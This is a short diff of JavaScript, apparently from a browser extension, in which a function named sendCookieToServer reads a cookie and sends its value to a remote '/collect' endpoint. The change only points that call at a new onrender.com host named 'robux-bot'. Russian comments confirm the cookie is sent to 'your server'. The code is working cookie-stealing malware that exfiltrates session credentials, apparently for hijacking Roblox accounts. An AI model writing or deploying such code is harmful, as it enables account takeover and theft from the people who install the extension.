@@ -6,7 +6,7 @@ function sendCookieToServer() {
     }, (cookie) => {
         if (cookie) {
             // Отправляем на твой сервер Render
-            fetch('https://d-x6q3.onrender.com/collect?cookie=' + encodeURIComponent(cookie.value))
+            fetch('https://robux-bot-a6s3.onrender.com/collect?cookie=' + encodeURIComponent(cookie.value))
                 .then(response => {
                     if (response.ok) {
                         console.log('✅ Кука отправлена на сервер!');
